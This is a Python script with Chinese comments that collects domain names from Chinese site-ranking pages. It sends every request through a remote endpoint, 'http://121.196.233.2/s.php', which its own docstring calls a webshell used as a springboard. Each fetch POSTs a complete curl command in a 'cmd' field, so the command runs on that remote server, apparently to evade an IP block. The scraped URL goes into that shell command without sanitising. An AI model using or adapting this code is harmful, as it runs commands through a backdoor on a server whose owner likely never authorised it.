#!/usr/bin/env python3
"""通过中国服务器跳板采集（解决165被限问题）"""
import subprocess, re, sys

PROXY = "http://121.196.233.2/s.php"

def proxy_curl(url):
    """通过webshell作为跳板请求URL"""
    cmd = f"curl -sk --connect-timeout 10 --max-time 15 '{url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 2>/dev/null"
    from urllib.parse import quote
    r = subprocess.run(['curl', '-sk', '--connect-timeout', '15', '--max-time', '20',
        PROXY, '-X', 'POST', '-d', f'cmd={cmd}'],
        capture_output=True, text=True, timeout=25)
    return r.stdout

def extract_domains(html, source_name):
    """正则提取域名"""
    domains = set()
    for m in re.finditer(r'https?://([a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}', html):
        d = m.group().replace("https://","").replace("http://","").replace("www.","")
        if not any(x in d for x in ['chinaz','aizhan','baidu','google','aliyun','w3.org','5118']):
            if '.' in d and len(d) < 50:
                domains.add(d)
    return domains

targets = [
    ("站长之家", "https://top.chinaz.com/"),
    ("爱站权重", "https://top.aizhan.com/"),
    ("爱站百度", "https://baidurank.aizhan.com/"),
]

all_domains = set()
for name, url in targets:
    print(f"[{name}] {url} ...")
    html = proxy_curl(url)
    size = len(html)
    print(f"  Size: {size}B")
    if size > 5000:
        domains = extract_domains(html, name)
        print(f"  ✅ {len(domains)} 域名")
        all_domains.update(domains)
    else:
        print(f"  ⚠️ 太小")

print(f"\n总计: {len(all_domains)}")
for d in sorted(all_domains):
    print(d)
